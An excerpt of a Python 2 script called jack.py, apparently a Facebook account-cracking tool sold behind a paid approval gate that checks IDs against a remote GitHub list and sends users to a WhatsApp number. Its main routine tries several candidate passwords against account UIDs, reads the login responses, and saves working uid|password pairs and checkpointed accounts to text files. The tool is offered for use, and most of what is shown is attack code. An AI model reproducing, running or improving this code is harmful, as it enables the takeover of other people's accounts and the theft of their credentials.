...
# File           : jack.py                            #
# Author         : William Jack                       #
# Github         : https://github.com/williamjack99   #
# Facebook       : https://www.fb.com/williamjack99   #
# Telegram       : https://t.me/williamjack99         #
# Python version : 3.8+                               #
# __author__ = 'William JACK'                         #
# __copyright = 'All rights reserved .                #
#      Copyright  William Jack'                       #
#######################################################
...
logo = '\n        @/William_.{w}#Jack..\n{r}  ________      ___       _______    ___      .______      \n{r} |       /     /   \     |   ____|  /   \     |   _  \     \n{g} `---/  /     /  ^  \    |  |__    /  ^  \    |  |_)  |    \n{g}    /  /     /  /_\  \   |   __|  /  /_\  \   |      /     \n{b}   /  /----./  _____  \  |  |    /  _____  \  |  |\  \----.\n{y}  /________/__/     \__\ |__|   /__/     \__\ | _| `._____|'

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login 5$ Rs.500 '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.WJ.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/nazeerjutt652/jutt-badshah/blob/main/server.txt').text
    if to in r:
        ...
        print ' \x1b[1;92m Your id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+92310020998')
        reg()
...
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80William\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    try:
        ...
        print logo
        print ''
        print '\t Turn on Phone data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on Phone data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.WJ.txt', 'r').read()
...
def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80William Jack\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        os.system('python2 jack.py')
    elif ms == '4':
        v_tok()
    elif ms == '5':
        lout()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80William Jack\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mWilliam Jack\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JACK-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JACK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[JACK-CP] ' + uid + ' | ' + pass1
                cp = open('JACK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JACK-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JACK_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[JACK-CP] ' + uid + ' | ' + pass2
                    cp = open('JACK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JACK-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JACK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[JACK-CP] ' + uid + ' | ' + pass3
                        cp = open('JACK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JACK-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JACK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[JACK-CP] ' + uid + ' | ' + pass4
                            cp = open('JACK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Willaim Jack\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mWillaim Jack\x1b[1;91m'
    print 47 * '-'
